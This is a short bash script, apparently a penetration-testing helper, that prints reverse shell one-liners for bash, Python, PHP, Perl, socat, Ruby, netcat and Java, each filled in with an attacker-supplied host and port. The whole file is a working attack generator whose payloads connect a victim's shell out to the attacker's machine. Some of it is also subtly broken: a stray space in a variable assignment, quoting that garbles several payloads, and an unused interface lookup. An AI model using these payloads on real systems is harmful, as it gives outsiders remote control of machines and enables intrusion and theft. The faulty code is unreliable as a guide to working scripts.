#!/bin/bash
echo -n "Welcome to a simple bash reverse shell generator"

while getopts t:i:p: flag
do
	case "${flag}" in
		t) type=${OPTARG};;
		i) lhost=${OPTARG};;
		p) port=${OPTARG};;
	esac
done

echo "Your options are: "
echo "Type: $type"
echo "LHOST: $lhost" 
echo "Port: $port"

filename= "shellgen.sh"
function help()
{

echo -e "Usage: ./$filename [ -t TYPE] [ -i LHOST ] [ -p PORT ]"

echo -e "options:"
echo -e "	-t TYPE 		The type of reverse shell that you want(e.g python, bash, perl)"
echo -e "	-i LHOST		Your desired host that you wish to be connected from via the attacker(e.g tun0)"
echo -e "	-p PORT			The port that you wish to host your listener on"
}


tun0="$(ip addr | grep tun0 | grep inet | grep 10. | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)"

echo -e "Your reverse shell is: \n"
if [  "$type" == "bash"  ]; then

	echo -n "bash -i >& /dev/tcp/$lhost/$port 0>&1"
elif [  "$type" == "python"  ]; then
	echo -n "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
elif [  "$type" == "php"  ]; then
	echo php -r '$sock=fsockopen("$lhost",$port);exec("/bin/sh -i <&3 >&3 2>&3");'
elif [  "$type" == "perl"  ]; then
	echo "perl -e" "'"'use Socket;$i="$lhost";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
elif [  "$type" == "socat"  ]; then
	echo -e "attacker: socat file:`tty`,raw,echo=0 TCP-L:$port"
	echo -e ""
	echo -e "victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$port"
elif [  "$type" == "ruby"  ]; then
	echo "ruby -rsocket -e""'f=TCPSocket.open("$lhost",$port).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f"")'"
elif [  "$type" == "netcat"  ]; then
	echo -e "nc -e /bin/sh $lhost $port" && echo -e
	echo -e "Another option is:" && echo -e 
	echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $port >/tmp/f"
elif [  "$type" == "java"  ]; then
	echo "r = Runtime.getRuntime()
p = r.exec([""/bin/bash"","-c",""exec 5<>/dev/tcp/$lhost/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done""] as String[])
p.waitFor()" 



else
	help
fi

